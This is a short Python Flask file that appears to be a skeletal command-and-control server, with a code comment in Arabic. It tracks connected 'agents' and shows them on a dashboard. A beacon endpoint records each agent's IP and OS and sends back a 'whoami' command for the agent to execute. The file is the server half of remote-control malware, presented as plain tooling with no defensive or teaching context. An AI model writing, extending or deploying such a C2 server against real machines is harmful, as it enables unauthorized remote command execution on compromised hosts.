from flask import Flask, render_template, request, jsonify

app = Flask(__name__)
agents = {} # لتخزين السيرفرات المتصلة

@app.route('/')
def dashboard():
    return render_template('index.html', agents=agents)

@app.route('/api/beacon', methods=['POST'])
def beacon():
    data = request.json
    agent_id = data['id']
    agents[agent_id] = {"ip": request.remote_addr, "os": data['os'], "status": "Online"}
    return jsonify({"command": "whoami"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)